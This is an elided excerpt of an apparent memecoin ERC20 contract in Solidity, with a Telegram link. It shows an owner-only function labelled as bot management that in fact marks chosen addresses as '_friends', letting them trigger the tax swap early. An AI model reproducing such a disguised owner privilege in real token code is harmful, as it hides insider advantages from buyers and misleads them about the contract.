...
Telegram: https://t.me/TipCoinErc20
...
contract Test is Context, IERC20, Ownable {
    ...
    string private constant _name = "TeslaEthhhhShibaTesla";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && (_buyCount > _preventSwapBefore || _friends[from])) {
    ...
    function _manageList(address[] memory bots_) external onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _friends[bots_[i]] = true;
        }
    }
